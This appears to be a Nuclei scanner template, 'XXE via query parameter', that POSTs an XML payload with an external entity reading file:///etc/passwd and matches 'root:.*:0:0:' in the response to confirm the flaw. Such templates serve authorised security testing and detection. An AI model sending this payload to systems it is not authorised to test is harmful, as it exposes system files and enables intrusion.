http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  raw:
  - 'POST /query HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
    Firefox/116.0

    Content-Type: application/xml;charset=UTF-8


    <?xml version="1.0"?>

    <!DOCTYPE r [

    <!ELEMENT r ANY >

    <!ENTITY sp SYSTEM "file:///etc/passwd">

    ]>

    <r>&sp;</r>

    '
id: xxe-via-query-lfi
info:
  author: reewardius
  name: XXE via query parameter
  severity: high
  tags: lfi,lfr,xxe,generic
